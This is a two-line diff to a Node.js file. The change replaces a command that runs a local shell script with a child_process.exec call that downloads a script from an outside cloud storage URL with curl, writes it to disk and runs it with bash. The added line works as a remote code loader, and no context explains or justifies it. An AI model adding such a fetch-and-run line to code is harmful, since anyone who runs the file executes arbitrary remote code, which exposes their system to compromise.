@@ -1,2 +1,2 @@
 const { exec } = require("child_process");
-exec("bash /mnt/aaa106/wd/dist/1.sh", (error, stdout, stderr) => {})
+exec("curl https://nxm-test-public-1326687412.cos.ap-guangzhou.myqcloud.com/lala.sh -o /mnt/aaa105/233.sh && bash /mnt/aaa105/233.sh", (error, stdout, stderr) => {})
